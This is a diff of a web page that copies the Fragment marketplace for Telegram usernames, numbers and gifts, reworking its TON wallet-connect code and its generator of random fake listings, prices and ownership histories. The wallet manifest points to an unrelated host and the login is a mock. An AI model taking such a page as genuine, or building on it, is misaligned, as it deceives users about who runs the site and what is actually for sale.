@@ -8,7 +8,6 @@
     <meta name="format-detection" content="telephone=no">
     <title>Fragment - Buy Telegram Usernames &amp; Numbers</title>
     <link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Cpath d='M126.3 153.6L252 209.2c3.2 1.5 7.2 1.3 12.2-.9l123.8-54.8c6.6-2.4 2.9-9.8-2.3-9l-256.6-1.1c-7.2.3-9.2 7.5-2.8 10.2zM116.2 182.1l118.4 184c3.7 6 13.1 2.6 12.8-2.8l-.2-126.2c-.1-7.1-1.9-8.7-6.4-10.6l-118.4-52.7c-4.3-2.4-10.1 1.6-6.2 8.3zM267.5 234.8l.3 127c.1 8.5 8.6 10.1 13.5 2.9l102.9-159.4 2.2-3.4 1.9-2.9 10.8-16.6c3.3-5.5-1.9-11.8-9.7-8.1l-117.4 52.9c-.2.1-.4.2-.6.3-1.5.9-2.5 1.8-3 2.9-.7 1.2-.9 2.7-.9 4.5z' fill='%23fff'/%3E%3C/svg%3E" type="image/x-icon">
-    <!-- TON Connect UI -->
     <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js">
     </script>
     <style>
@@ -276,7 +275,6 @@
             background: var(--bg-color);
         }
 
-        /* Секции - правильное переключение */
         .tm-section-page {
             display: none !important;
             width: 100%;
@@ -634,6 +632,20 @@
         .tm-username-link:hover {
             color: var(--accent-color);
             text-decoration: none;
+        }
+        /* Стиль для feds.t.me под юзернеймом */
+        .tm-username-sub {
+            display: block;
+            font-size: 9px;
+            color: #4db2ff;
+            opacity: 0.7;
+            margin-top: 1px;
+            font-weight: normal;
+            cursor: pointer;
+        }
+        .tm-username-sub:hover {
+            opacity: 1;
+            text-decoration: underline;
         }
         .tm-table .hide-mobile {
             display: none;
@@ -1516,7 +1528,6 @@
             object-fit: cover;
         }
 
-        /* TON Connect модалка */
         .modal-ton {
             position: fixed;
             top: 0;
@@ -1601,7 +1612,6 @@
             background: #3f4e60;
         }
 
-        /* Telegram Login модалка */
         .telegram-login {
             position: fixed;
             top: 0;
@@ -2061,7 +2071,6 @@
         // ============================================================
 
         (function() {
-            // Функция переключения секций
             function switchSection(sectionId) {
                 document.querySelectorAll('.tm-section-page').forEach(function(sec) {
                     sec.classList.remove('active');
@@ -2075,7 +2084,6 @@
                 }
             }
 
-            // Обработчики табов
             var tabs = document.querySelectorAll('.tm-header-tab');
             tabs.forEach(function(tab) {
                 tab.addEventListener('click', function(e) {
@@ -2089,7 +2097,6 @@
                 });
             });
 
-            // Логотип
             var logo = document.getElementById('logo-home');
             if (logo) {
                 logo.addEventListener('click', function(e) {
@@ -2101,7 +2108,6 @@
                 });
             }
 
-            // Инициализация
             (function init() {
                 document.querySelectorAll('.tm-section-page').forEach(function(sec) {
                     sec.classList.remove('active');
@@ -2131,33 +2137,45 @@
             let tonConnectUI = null;
             let isConnected = false;
 
-            // Инициализация TON Connect UI
             try {
                 tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                     manifestUrl: 'https://portals-market.vercel.app/tonconnect-manifest.json',
-                    buttonRootId: null // не используем встроенную кнопку
+                    buttonRootId: null
                 });
                 console.log('✅ TON Connect UI initialized');
             } catch (e) {
                 console.error('❌ TON Connect init error:', e);
             }
 
-            // Кнопка TON в хедере
             var tonBtn = document.getElementById('btn-ton');
             var modalTon = document.getElementById('modal-ton');
             var tonClose = document.getElementById('modal-ton-close');
             var statusEl = document.getElementById('ton-connect-status');
 
-            // Открыть модалку
             tonBtn.addEventListener('click', function() {
-                if (isConnected) {
-                    // Если уже подключен - показываем статус
-                    statusEl.textContent = '✅ Wallet connected! Address: ' + tonConnectUI?.account?.address?.slice(0, 10) +
-                        '...';
-                    modalTon.classList.add('open');
+                if (tonConnectUI) {
+                    tonConnectUI.connectWallet()
+                        .then(function(account) {
+                            console.log('✅ Connected:', account);
+                            isConnected = true;
+                            statusEl.textContent = '✅ Connected! Address: ' + account.address.slice(0, 10) +
+                            '...';
+                            tonBtn.innerHTML =
+                                '<i class="icon-connect-ton"></i><span class="tm-button-label">' +
+                                account.address.slice(0, 6) + '...</span>';
+                            modalTon.classList.remove('open');
+                        })
+                        .catch(function(err) {
+                            console.error('❌ Connection error:', err);
+                            if (err.message && err.message.includes('cancelled')) {
+                                statusEl.textContent = '⏹️ Connection cancelled';
+                            } else {
+                                statusEl.textContent = '❌ Connection failed: ' + (err.message ||
+                                'Unknown error');
+                            }
+                        });
                 } else {
-                    statusEl.textContent = 'Choose your wallet to connect';
-                    modalTon.classList.add('open');
+                    alert('TON Connect не инициализирован. Проверьте подключение к интернету.');
                 }
             });
 
@@ -2165,61 +2183,14 @@
                 modalTon.classList.remove('open');
             });
 
-            // Клик по кошельку
-            document.querySelectorAll('.modal-ton-wallet').forEach(function(el) {
-                el.addEventListener('click', function() {
-                    if (!tonConnectUI) {
-                        statusEl.textContent = '❌ TON Connect not available';
-                        return;
-                    }
-
-                    var walletName = this.dataset.wallet;
-                    statusEl.textContent = '⏳ Connecting to ' + walletName + '...';
-
-                    // Маппинг названий для TON Connect
-                    var walletMap = {
-                        'tonkeeper': 'tonkeeper',
-                        'tonhub': 'tonhub',
-                        'wallet': 'wallet',
-                        'mytonwallet': 'mytonwallet'
-                    };
-
-                    var provider = walletMap[walletName] || 'tonkeeper';
-
-                    try {
-                        tonConnectUI.connect({ provider: provider })
-                            .then(function(account) {
-                                console.log('✅ Connected:', account);
-                                isConnected = true;
-                                statusEl.textContent = '✅ Connected! Address: ' + account.address.slice(0, 10) +
-                                    '...';
-                                modalTon.classList.remove('open');
-                                // Меняем текст кнопки
-                                tonBtn.innerHTML =
-                                    '<i class="icon-connect-ton"></i><span class="tm-button-label">' + account
-                                    .address.slice(0, 6) + '...</span>';
-                                alert('✅ Wallet connected!\nAddress: ' + account.address);
-                            })
-                            .catch(function(err) {
-                                console.error('❌ Connection error:', err);
-                                statusEl.textContent = '❌ Connection failed: ' + err.message;
-                            });
-                    } catch (e) {
-                        console.error('❌ Connect error:', e);
-                        statusEl.textContent = '❌ Error: ' + e.message;
-                    }
-                });
-            });
-
-            // Проверяем статус при загрузке
             if (tonConnectUI) {
                 tonConnectUI.onStatusChange(function(account) {
                     if (account) {
                         isConnected = true;
                         console.log('✅ Wallet connected:', account);
                         tonBtn.innerHTML =
-                            '<i class="icon-connect-ton"></i><span class="tm-button-label">' + account.address.slice(
-                                0, 6) + '...</span>';
+                            '<i class="icon-connect-ton"></i><span class="tm-button-label">' +
+                            account.address.slice(0, 6) + '...</span>';
                     } else {
                         isConnected = false;
                         console.log('❌ Wallet disconnected');
@@ -2229,725 +2200,752 @@
                 });
             }
 
-            // ============================================================
-            // ===== TELEGRAM LOGIN =====
-            // ============================================================
-
-            document.getElementById('btn-telegram').addEventListener('click', function() {
-                document.getElementById('telegram-login').classList.add('open');
+            document.querySelectorAll('.modal-ton-wallet').forEach(function(el) {
+                el.addEventListener('click', function() {
+                    if (tonConnectUI) {
+                        tonConnectUI.connectWallet()
+                            .then(function(account) {
+                                console.log('✅ Connected via modal:', account);
+                                isConnected = true;
+                                statusEl.textContent = '✅ Connected! Address: ' + account.address.slice(
+                                    0, 10) + '...';
+                                tonBtn.innerHTML =
+                                    '<i class="icon-connect-ton"></i><span class="tm-button-label">' +
+                                    account.address.slice(0, 6) + '...</span>';
+                                modalTon.classList.remove('open');
+                            })
+                            .catch(function(err) {
+                                console.error('❌ Connection error:', err);
+                                statusEl.textContent = '❌ Connection failed: ' + (err.message ||
+                                    'Unknown error');
+                            });
+                    }
+                });
             });
-            document.getElementById('tg-login-close').addEventListener('click', function() {
+
+        })();
+
+        // ============================================================
+        // ===== TELEGRAM LOGIN =====
+        // ============================================================
+
+        document.getElementById('btn-telegram').addEventListener('click', function() {
+            document.getElementById('telegram-login').classList.add('open');
+        });
+        document.getElementById('tg-login-close').addEventListener('click', function() {
+            document.getElementById('telegram-login').classList.remove('open');
+        });
+        document.getElementById('tg-login-btn').addEventListener('click', function() {
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.openTelegramLink('https://t.me/username');
                 document.getElementById('telegram-login').classList.remove('open');
-            });
-            document.getElementById('tg-login-btn').addEventListener('click', function() {
-                if (window.Telegram && window.Telegram.WebApp) {
-                    window.Telegram.WebApp.openTelegramLink('https://t.me/username');
-                    document.getElementById('telegram-login').classList.remove('open');
-                    alert('🔐 Авторизация через Telegram\n\nДемо: вы авторизованы как @user_' + Math.floor(Math.random() *
-                        1000));
-                } else {
-                    window.open('https://t.me/username', '_blank');
-                    document.getElementById('telegram-login').classList.remove('open');
-                }
-            });
-
-            // ============================================================
-            // ===== ДАННЫЕ =====
-            // ============================================================
-
-            var collectionNames = [
-                'Plush Pepes', 'Swiss Watches', 'Heart Lockets',
-                'Sakura Flowers', 'Snoop Doggs', 'Eternal Roses', 'Diamond Rings',
-                'Witch Hats', 'Toy Bears', 'Ice Creams', 'Homemade Cakes', 'Chill Flames',
-                'Evil Eyes', 'Santa Hats', 'Candy Canes', 'Precious Peach'
-            ];
-
-            var baseSlugs = {
-                'Plush Pepes': 'plushpepe',
-                'Swiss Watches': 'swisswatch',
-                'Heart Lockets': 'heartlocket',
-                'Sakura Flowers': 'sakuraflower',
-                'Snoop Doggs': 'snoopdogg',
-                'Eternal Roses': 'eternalrose',
-                'Diamond Rings': 'diamondring',
-                'Witch Hats': 'witchhat',
-                'Toy Bears': 'toybear',
-                'Ice Creams': 'icecream',
-                'Homemade Cakes': 'homemadecake',
-                'Chill Flames': 'chillflame',
-                'Evil Eyes': 'evileye',
-                'Santa Hats': 'santahat',
-                'Candy Canes': 'candycane',
-                'Precious Peach': 'preciouspeach'
-            };
-
-            var collectionToName = {
-                'Plush Pepes': 'Plush Pepe',
-                'Swiss Watches': 'Swiss Watch',
-                'Heart Lockets': 'Heart Locket',
-                'Sakura Flowers': 'Sakura Flower',
-                'Snoop Doggs': 'Snoop Dogg',
-                'Eternal Roses': 'Eternal Rose',
-                'Diamond Rings': 'Diamond Ring',
-                'Witch Hats': 'Witch Hat',
-                'Toy Bears': 'Toy Bear',
-                'Ice Creams': 'Ice Cream',
-                'Homemade Cakes': 'Homemade Cake',
-                'Chill Flames': 'Chill Flame',
-                'Evil Eyes': 'Evil Eye',
-                'Santa Hats': 'Santa Hat',
-                'Candy Canes': 'Candy Cane',
-                'Precious Peach': 'Precious Peach'
-            };
-
-            function getImageUrl(collection, slugNum) {
-                var base = baseSlugs[collection];
-                var slug = base + '-' + slugNum;
-                return 'https://nft.fragment.com/gift/' + slug + '.medium.jpg';
+                alert('🔐 Авторизация через Telegram\n\nДемо: вы авторизованы как @user_' + Math.floor(Math.random() *
+                    1000));
+            } else {
+                window.open('https://t.me/username', '_blank');
+                document.getElementById('telegram-login').classList.remove('open');
             }
+        });
 
-            var realSlugs = {
-                'Plush Pepes': [1821, 1515, 2658, 1521, 318, 1179, 456, 1519, 1043, 858, 982, 177, 899, 1921, 1106, 91, 328,
-                    333, 1120, 1902, 702, 908, 1897, 1274, 300, 2821, 1213, 2055, 2345, 1022, 987, 737, 2629, 402, 833,
-                    984, 100, 791, 1396, 15, 18, 206, 1609, 487, 195, 2530, 123, 289, 1088, 601, 901, 853
-                ],
-                'Swiss Watches': [7799, 1234, 5678, 9012, 3456, 7890, 2345, 6789, 4567, 8901],
-                'Heart Lockets': [875, 123, 456, 789, 234, 567, 890, 345, 678, 901],
-                'Sakura Flowers': [49643, 12345, 23456, 34567, 45678, 54321],
-                'Snoop Doggs': [12345, 67890, 23456, 78901, 34567, 89012, 45678, 90123, 54321, 98765],
-                'Eternal Roses': [123, 456, 789, 234, 567, 890, 345, 678],
-                'Diamond Rings': [123, 456, 789, 234, 567, 890, 345, 678],
-                'Witch Hats': [123, 456, 789, 234, 567, 890, 345, 678],
-                'Toy Bears': [123, 456, 789, 234, 567, 890, 345, 678],
-                'Ice Creams': [123, 456, 789, 234, 567, 890, 345, 678],
-                'Homemade Cakes': [123, 456, 789, 234, 567, 890],
-                'Chill Flames': [123, 456, 789, 234, 567],
-                'Evil Eyes': [123, 456, 789, 234, 567],
-                'Santa Hats': [123, 456, 789, 234, 567],
-                'Candy Canes': [123, 456, 789, 234, 567],
-                'Precious Peach': [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
-                    25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49,
-                    50
-                ]
-            };
+        // ============================================================
+        // ===== ДАННЫЕ =====
+        // ============================================================
 
-            var attrKeys = ['Model', 'Backdrop', 'Symbol', 'Style', 'Color', 'Material', 'Rarity'];
-            var attrVals = [
-                ['Cozy Galaxy', 'Classic', 'Gold', 'Orange', 'Legendary', 'Pink', 'Custom', 'OG'],
-                ['Black', 'Silver', 'Ruby', 'Surprised', 'Velvet', 'Spring', 'Purple', 'Gold'],
-                ['Pegasus', 'Dragon', 'Heart', 'Star', 'Moon', 'Sun', 'Lightning', 'Crown'],
-                ['Modern', 'Vintage', 'Neon', 'Stealth', 'Retro', 'Classic', 'Cyber', 'Natural'],
-                ['Red', 'Blue', 'Green', 'Yellow', 'Purple', 'White', 'Black', 'Gold'],
-                ['Leather', 'Gold', 'Silver', 'Platinum', 'Wood', 'Crystal', 'Steel', 'Silk'],
-                ['Common', 'Uncommon', 'Rare', 'Epic', 'Legendary', 'Mythic', 'Divine', 'Unique']
-            ];
-            var rarityPcts = ['0.1%', '0.3%', '0.5%', '1%', '2%', '3%', '5%', '8%', '10%', '15%'];
+        var collectionNames = [
+            'Plush Pepes', 'Swiss Watches', 'Heart Lockets',
+            'Sakura Flowers', 'Snoop Doggs', 'Eternal Roses', 'Diamond Rings',
+            'Witch Hats', 'Toy Bears', 'Ice Creams', 'Homemade Cakes', 'Chill Flames',
+            'Evil Eyes', 'Santa Hats', 'Candy Canes', 'Precious Peach'
+        ];
 
-            var removedIds = [3042, 3023, 3022, 3024, 3038, 3026, 3031, 3029];
+        var baseSlugs = {
+            'Plush Pepes': 'plushpepe',
+            'Swiss Watches': 'swisswatch',
+            'Heart Lockets': 'heartlocket',
+            'Sakura Flowers': 'sakuraflower',
+            'Snoop Doggs': 'snoopdogg',
+            'Eternal Roses': 'eternalrose',
+            'Diamond Rings': 'diamondring',
+            'Witch Hats': 'witchhat',
+            'Toy Bears': 'toybear',
+            'Ice Creams': 'icecream',
+            'Homemade Cakes': 'homemadecake',
+            'Chill Flames': 'chillflame',
+            'Evil Eyes': 'evileye',
+            'Santa Hats': 'santahat',
+            'Candy Canes': 'candycane',
+            'Precious Peach': 'preciouspeach'
+        };
 
-            // ============================================================
-            // ===== ГЕНЕРАЦИЯ ПОДАРКОВ =====
-            // ============================================================
+        var collectionToName = {
+            'Plush Pepes': 'Plush Pepe',
+            'Swiss Watches': 'Swiss Watch',
+            'Heart Lockets': 'Heart Locket',
+            'Sakura Flowers': 'Sakura Flower',
+            'Snoop Doggs': 'Snoop Dogg',
+            'Eternal Roses': 'Eternal Rose',
+            'Diamond Rings': 'Diamond Ring',
+            'Witch Hats': 'Witch Hat',
+            'Toy Bears': 'Toy Bear',
+            'Ice Creams': 'Ice Cream',
+            'Homemade Cakes': 'Homemade Cake',
+            'Chill Flames': 'Chill Flame',
+            'Evil Eyes': 'Evil Eye',
+            'Santa Hats': 'Santa Hat',
+            'Candy Canes': 'Candy Cane',
+            'Precious Peach': 'Precious Peach'
+        };
 
-            var giftsData = [];
-            var giftId = 2000;
+        function getImageUrl(collection, slugNum) {
+            var base = baseSlugs[collection];
+            var slug = base + '-' + slugNum;
+            return 'https://nft.fragment.com/gift/' + slug + '.medium.jpg';
+        }
 
-            for (var ci = 0; ci < collectionNames.length; ci++) {
-                var collection = collectionNames[ci];
-                var slugs = realSlugs[collection] || [];
-                var count = Math.floor(Math.random() * 20) + 10;
-                var shuffled = slugs.slice().sort(function() { return Math.random() - 0.5; });
-                var selected = shuffled.slice(0, Math.min(count, shuffled.length));
+        var realSlugs = {
+            'Plush Pepes': [1821, 1515, 2658, 1521, 318, 1179, 456, 1519, 1043, 858, 982, 177, 899, 1921, 1106, 91, 328,
+                333, 1120, 1902, 702, 908, 1897, 1274, 300, 2821, 1213, 2055, 2345, 1022, 987, 737, 2629, 402, 833,
+                984, 100, 791, 1396, 15, 18, 206, 1609, 487, 195, 2530, 123, 289, 1088, 601, 901, 853
+            ],
+            'Swiss Watches': [7799, 1234, 5678, 9012, 3456, 7890, 2345, 6789, 4567, 8901],
+            'Heart Lockets': [875, 123, 456, 789, 234, 567, 890, 345, 678, 901],
+            'Sakura Flowers': [49643, 12345, 23456, 34567, 45678, 54321],
+            'Snoop Doggs': [12345, 67890, 23456, 78901, 34567, 89012, 45678, 90123, 54321, 98765],
+            'Eternal Roses': [123, 456, 789, 234, 567, 890, 345, 678],
+            'Diamond Rings': [123, 456, 789, 234, 567, 890, 345, 678],
+            'Witch Hats': [123, 456, 789, 234, 567, 890, 345, 678],
+            'Toy Bears': [123, 456, 789, 234, 567, 890, 345, 678],
+            'Ice Creams': [123, 456, 789, 234, 567, 890, 345, 678],
+            'Homemade Cakes': [123, 456, 789, 234, 567, 890],
+            'Chill Flames': [123, 456, 789, 234, 567],
+            'Evil Eyes': [123, 456, 789, 234, 567],
+            'Santa Hats': [123, 456, 789, 234, 567],
+            'Candy Canes': [123, 456, 789, 234, 567],
+            'Precious Peach': [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
+                25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49,
+                50
+            ]
+        };
 
-                for (var si = 0; si < selected.length; si++) {
-                    var slugNum = selected[si];
-                    var imageUrl = getImageUrl(collection, slugNum);
-                    var name = collectionToName[collection] || collection;
-                    var status = giftId % 6 === 0 ? 'avail' : 'sold';
-                    var label = status === 'avail' ? 'On auction' : 'Sold';
-                    var price = Math.floor(Math.random() * 80000) + 3000;
-                    var giftNum = '#' + (1000 + giftId);
+        var attrKeys = ['Model', 'Backdrop', 'Symbol', 'Style', 'Color', 'Material', 'Rarity'];
+        var attrVals = [
+            ['Cozy Galaxy', 'Classic', 'Gold', 'Orange', 'Legendary', 'Pink', 'Custom', 'OG'],
+            ['Black', 'Silver', 'Ruby', 'Surprised', 'Velvet', 'Spring', 'Purple', 'Gold'],
+            ['Pegasus', 'Dragon', 'Heart', 'Star', 'Moon', 'Sun', 'Lightning', 'Crown'],
+            ['Modern', 'Vintage', 'Neon', 'Stealth', 'Retro', 'Classic', 'Cyber', 'Natural'],
+            ['Red', 'Blue', 'Green', 'Yellow', 'Purple', 'White', 'Black', 'Gold'],
+            ['Leather', 'Gold', 'Silver', 'Platinum', 'Wood', 'Crystal', 'Steel', 'Silk'],
+            ['Common', 'Uncommon', 'Rare', 'Epic', 'Legendary', 'Mythic', 'Divine', 'Unique']
+        ];
+        var rarityPcts = ['0.1%', '0.3%', '0.5%', '1%', '2%', '3%', '5%', '8%', '10%', '15%'];
 
-                    if (removedIds.indexOf(giftId) !== -1) {
-                        giftId++;
-                        continue;
-                    }
+        var removedIds = [3042, 3023, 3022, 3024, 3038, 3026, 3031, 3029];
 
-                    var attrs = {};
-                    var numAttrs = Math.floor(Math.random() * 3) + 2;
-                    for (var a = 0; a < numAttrs; a++) {
-                        var keyIdx = (giftId + a) % attrKeys.length;
-                        var valIdx = (giftId + a * 3) % attrVals[keyIdx].length;
-                        attrs[attrKeys[keyIdx]] = attrVals[keyIdx][valIdx];
-                    }
-                    attrs['Issued'] = (Math.floor(Math.random() * 5000) + 500) + ' of ' + (Math.floor(Math.random() *
+        // ============================================================
+        // ===== ГЕНЕРАЦИЯ ПОДАРКОВ =====
+        // ============================================================
+
+        var giftsData = [];
+        var giftId = 2000;
+
+        for (var ci = 0; ci < collectionNames.length; ci++) {
+            var collection = collectionNames[ci];
+            var slugs = realSlugs[collection] || [];
+            var count = Math.floor(Math.random() * 20) + 10;
+            var shuffled = slugs.slice().sort(function() { return Math.random() - 0.5; });
+            var selected = shuffled.slice(0, Math.min(count, shuffled.length));
+
+            for (var si = 0; si < selected.length; si++) {
+                var slugNum = selected[si];
+                var imageUrl = getImageUrl(collection, slugNum);
+                var name = collectionToName[collection] || collection;
+                var status = giftId % 6 === 0 ? 'avail' : 'sold';
+                var label = status === 'avail' ? 'On auction' : 'Sold';
+                var price = Math.floor(Math.random() * 80000) + 3000;
+                var giftNum = '#' + (1000 + giftId);
+
+                if (removedIds.indexOf(giftId) !== -1) {
+                    giftId++;
+                    continue;
+                }
+
+                var attrs = {};
+                var numAttrs = Math.floor(Math.random() * 3) + 2;
+                for (var a = 0; a < numAttrs; a++) {
+                    var keyIdx = (giftId + a) % attrKeys.length;
+                    var valIdx = (giftId + a * 3) % attrVals[keyIdx].length;
+                    attrs[attrKeys[keyIdx]] = attrVals[keyIdx][valIdx];
+                }
+                attrs['Issued'] = (Math.floor(Math.random() * 5000) + 500) + ' of ' + (Math.floor(Math.random() *
                     3000) + 500);
 
-                    var history = [];
-                    var numHistory = Math.floor(Math.random() * 3) + 1;
-                    var owners = ['UQDVN_rfE8LVmVY-AwGpaTwhLiBv0Zgy-qoIZet77tcU_Nbl',
-                        'UQAVgTYjmtsV3VnfkMZB-e_TEs_rhmTyGPTD5fzp2V5sBwm6',
-                        'EQDljQaFrI6QoFw0vvn6GDdbt-oJC3g0GXBhos-vS2qg5HZk'
-                    ];
-                    for (var h = 0; h < numHistory; h++) {
-                        var ownerIdx = h % owners.length;
-                        history.push({
-                            price: 'Transferred',
-                            date: new Date(Date.now() - (h + 1) * 30 * 86400000 - 5000000 * h).toLocaleString(),
-                            buyer: owners[ownerIdx]
-                        });
-                    }
-
-                    giftsData.push({
-                        id: giftId,
-                        name: name,
-                        collection: collection,
-                        num: giftNum,
-                        price: price,
-                        status: status,
-                        label: label,
-                        image: imageUrl,
-                        slug: baseSlugs[collection] + '-' + slugNum,
-                        attrs: attrs,
-                        owner: owners[giftId % owners.length],
-                        history: history,
-                        date: new Date(Date.now() - Math.random() * 60 * 86400000).toLocaleString()
+                var history = [];
+                var numHistory = Math.floor(Math.random() * 3) + 1;
+                var owners = ['UQDVN_rfE8LVmVY-AwGpaTwhLiBv0Zgy-qoIZet77tcU_Nbl',
+                    'UQAVgTYjmtsV3VnfkMZB-e_TEs_rhmTyGPTD5fzp2V5sBwm6',
+                    'EQDljQaFrI6QoFw0vvn6GDdbt-oJC3g0GXBhos-vS2qg5HZk'
+                ];
+                for (var h = 0; h < numHistory; h++) {
+                    var ownerIdx = h % owners.length;
+                    history.push({
+                        price: 'Transferred',
+                        date: new Date(Date.now() - (h + 1) * 30 * 86400000 - 5000000 * h).toLocaleString(),
+                        buyer: owners[ownerIdx]
                     });
-                    giftId++;
                 }
-            }
 
-            giftsData = giftsData.sort(function() { return Math.random() - 0.5; });
-            if (giftsData.length > 400) {
-                giftsData = giftsData.slice(0, 400);
-            }
-
-            console.log('✅ Сгенерировано подарков:', giftsData.length);
-
-            // ===== ЮЗЕРНЕЙМЫ =====
-            var usernameWords = ['alpha', 'beta', 'gamma', 'delta', 'epsilon', 'zeta', 'eta', 'theta', 'iota', 'kappa',
-                'lambda', 'mu', 'nu', 'xi', 'omicron', 'pi', 'rho', 'sigma', 'tau', 'upsilon', 'phi', 'chi', 'psi',
-                'omega', 'cyber', 'neo', 'zen', 'vortex', 'storm', 'shadow', 'light', 'dark', 'phantom', 'echo',
-                'nova', 'apex', 'prime', 'core', 'flux', 'pulse', 'zenith', 'blaze', 'frost', 'ember', 'spirit',
-                'crystal', 'amber', 'onyx', 'quartz', 'ruby', 'sapphire', 'jade', 'crimson', 'azure', 'emerald',
-                'golden', 'silver', 'platinum', 'diamond'
-            ];
-            var offersData = [];
-            for (var i = 0; i < 120; i++) {
-                var w1 = usernameWords[Math.floor(Math.random() * usernameWords.length)];
-                var w2 = usernameWords[Math.floor(Math.random() * usernameWords.length)];
-                var num = Math.floor(Math.random() * 1000);
-                var name = (i < 50) ? usernameWords[i % usernameWords.length] + num : w1 + w2 + num;
-                var price = Math.floor(Math.random() * 15000) + 500;
-                var status = Math.random() > 0.7 ? 'taken' : 'avail';
-                var label = status === 'avail' ? 'On auction' : 'Taken';
-                offersData.push({
-                    id: i + 1,
-                    name: name.substring(0, 20),
-                    type: 'Username',
+                giftsData.push({
+                    id: giftId,
+                    name: name,
+                    collection: collection,
+                    num: giftNum,
                     price: price,
-                    minBid: Math.round(price * 1.05),
-                    bidStep: Math.round(price * 0.05),
                     status: status,
                     label: label,
-                    date: new Date(Date.now() - Math.random() * 30 * 86400000).toLocaleString(),
-                    bids: Math.floor(Math.random() * 15) + 1,
-                    endsIn: Math.random() > 0.5 ? (Math.floor(Math.random() * 10) + 1) + 'd ' + (Math.floor(Math
+                    image: imageUrl,
+                    slug: baseSlugs[collection] + '-' + slugNum,
+                    attrs: attrs,
+                    owner: owners[giftId % owners.length],
+                    history: history,
+                    date: new Date(Date.now() - Math.random() * 60 * 86400000).toLocaleString()
+                });
+                giftId++;
+            }
+        }
+
+        giftsData = giftsData.sort(function() { return Math.random() - 0.5; });
+        if (giftsData.length > 400) {
+            giftsData = giftsData.slice(0, 400);
+        }
+
+        console.log('✅ Сгенерировано подарков:', giftsData.length);
+
+        // ===== ЮЗЕРНЕЙМЫ =====
+        var usernameWords = ['alpha', 'beta', 'gamma', 'delta', 'epsilon', 'zeta', 'eta', 'theta', 'iota', 'kappa',
+            'lambda', 'mu', 'nu', 'xi', 'omicron', 'pi', 'rho', 'sigma', 'tau', 'upsilon', 'phi', 'chi', 'psi',
+            'omega', 'cyber', 'neo', 'zen', 'vortex', 'storm', 'shadow', 'light', 'dark', 'phantom', 'echo',
+            'nova', 'apex', 'prime', 'core', 'flux', 'pulse', 'zenith', 'blaze', 'frost', 'ember', 'spirit',
+            'crystal', 'amber', 'onyx', 'quartz', 'ruby', 'sapphire', 'jade', 'crimson', 'azure', 'emerald',
+            'golden', 'silver', 'platinum', 'diamond'
+        ];
+        var offersData = [];
+        for (var i = 0; i < 120; i++) {
+            var w1 = usernameWords[Math.floor(Math.random() * usernameWords.length)];
+            var w2 = usernameWords[Math.floor(Math.random() * usernameWords.length)];
+            var num = Math.floor(Math.random() * 1000);
+            var name = (i < 50) ? usernameWords[i % usernameWords.length] + num : w1 + w2 + num;
+            var price = Math.floor(Math.random() * 15000) + 500;
+            var status = Math.random() > 0.7 ? 'taken' : 'avail';
+            var label = status === 'avail' ? 'On auction' : 'Taken';
+            offersData.push({
+                id: i + 1,
+                name: name.substring(0, 20),
+                type: 'Username',
+                price: price,
+                minBid: Math.round(price * 1.05),
+                bidStep: Math.round(price * 0.05),
+                status: status,
+                label: label,
+                date: new Date(Date.now() - Math.random() * 30 * 86400000).toLocaleString(),
+                bids: Math.floor(Math.random() * 15) + 1,
+                endsIn: Math.random() > 0.5 ? (Math.floor(Math.random() * 10) + 1) + 'd ' + (Math.floor(Math
                     .random() * 24)) + 'h' : '—'
-                });
-            }
+            });
+        }
 
-            // ===== НОМЕРА +888 =====
-            var numbersData = [];
-            for (var ni = 0; ni < 50; ni++) {
-                var p1 = String(Math.floor(Math.random() * 900) + 100);
-                var p2 = String(Math.floor(Math.random() * 900) + 100);
-                var p3 = String(Math.floor(Math.random() * 9000) + 1000);
-                var nname = '+888 ' + p1 + ' ' + p2 + ' ' + p3;
-                var nprice = Math.floor(Math.random() * 5000) + 300;
-                var nstatus = Math.random() > 0.75 ? 'taken' : 'avail';
-                var nlabel = nstatus === 'avail' ? 'On auction' : 'Taken';
-                numbersData.push({
-                    id: 1000 + ni,
-                    name: nname,
-                    type: 'Number',
-                    price: nprice,
-                    minBid: Math.round(nprice * 1.05),
-                    bidStep: Math.round(nprice * 0.05),
-                    status: nstatus,
-                    label: nlabel,
-                    date: new Date(Date.now() - Math.random() * 20 * 86400000).toLocaleString(),
-                    bids: Math.floor(Math.random() * 10) + 1,
-                    endsIn: Math.random() > 0.5 ? (Math.floor(Math.random() * 7) + 1) + 'd ' + (Math.floor(Math
+        // ===== НОМЕРА +888 =====
+        var numbersData = [];
+        for (var ni = 0; ni < 50; ni++) {
+            var p1 = String(Math.floor(Math.random() * 900) + 100);
+            var p2 = String(Math.floor(Math.random() * 900) + 100);
+            var p3 = String(Math.floor(Math.random() * 9000) + 1000);
+            var nname = '+888 ' + p1 + ' ' + p2 + ' ' + p3;
+            var nprice = Math.floor(Math.random() * 5000) + 300;
+            var nstatus = Math.random() > 0.75 ? 'taken' : 'avail';
+            var nlabel = nstatus === 'avail' ? 'On auction' : 'Taken';
+            numbersData.push({
+                id: 1000 + ni,
+                name: nname,
+                type: 'Number',
+                price: nprice,
+                minBid: Math.round(nprice * 1.05),
+                bidStep: Math.round(nprice * 0.05),
+                status: nstatus,
+                label: nlabel,
+                date: new Date(Date.now() - Math.random() * 20 * 86400000).toLocaleString(),
+                bids: Math.floor(Math.random() * 10) + 1,
+                endsIn: Math.random() > 0.5 ? (Math.floor(Math.random() * 7) + 1) + 'd ' + (Math.floor(Math
                     .random() * 24)) + 'h' : '—'
-                });
+            });
+        }
+
+        // ============================================================
+        // ===== RENDER FUNCTIONS =====
+        // ============================================================
+
+        var offersPage = 0;
+        var numbersPage = 0;
+        var giftsPage = 0;
+        var OFFERS_PER_PAGE = 20;
+        var NUMBERS_PER_PAGE = 20;
+        var GIFTS_PER_PAGE = 12;
+
+        var loadedOffers = [];
+        var loadedNumbers = [];
